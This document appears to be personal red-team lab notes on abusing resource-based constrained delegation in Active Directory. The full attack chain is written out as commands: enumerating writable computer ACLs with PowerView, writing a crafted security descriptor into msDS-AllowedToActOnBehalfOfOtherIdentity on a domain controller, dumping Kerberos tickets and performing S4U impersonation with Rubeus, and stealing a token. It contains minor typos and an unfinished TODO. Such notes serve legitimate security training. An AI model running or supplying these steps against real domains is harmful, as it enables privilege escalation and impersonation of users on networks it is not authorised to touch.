> This abuse checks whether we have writing permissions on another computers (ACLs) and overwrites the msDS-AllowedToActOnBehalfOfOtherIdentity
> We need one of the following properties: WriteProperty, GenericAll, GenericWrite or WriteDacl

> This makes it much more likely to present itself as a privilege escalation / lateral movement opportunity

We need to things:

- A target computer on which you can modify msDS-AllowedToActOnBehalfOfOtherIdentity.
- Control of another principal that has an SPN.

In other words, Elevated access on ANY machine, and that elevated access must be with a user that is part of the group DEV\Developers, which is the group that has access WriteProperty on All

# First we query domain computers and read their ACL

```bash
powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

ObjectDN               : CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io (on the DC)
ActiveDirectoryRights  : Self, WriteProperty (rights here)
ObjectAceType          : All (over all properties)
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1000 (SID of object that is allowed)

```

# Check which group this is

```bash
powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
```

---

# We then use the SID of our compromised Computer and add it to msDS-AllowedToActOnBehalfOfOtherIdentity

```bash
# Get SID
powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
objectsid
---------
S-1-5-21-569305411-121244042-2357301523-1109

# Convert the content to  binary format
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
$rsdb = New-Object byte[] ($rsd.BinaryLength)
$rsd.GetBinaryForm($rsdb, 0)

# Update the value
powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

---

# Next we use the WKSTN-2$ account to perform s4u impersonation

```bash
# Get tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# Dump WKSTN-2$ ticket for krbtgt
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# Use that ticket to impersonate a user
exeute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

# Use the user tgs ticket for nlamb to start a process and store the token
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
steal_token 1234
```

---

# TODO (if not elevated on machine, create one - steps)
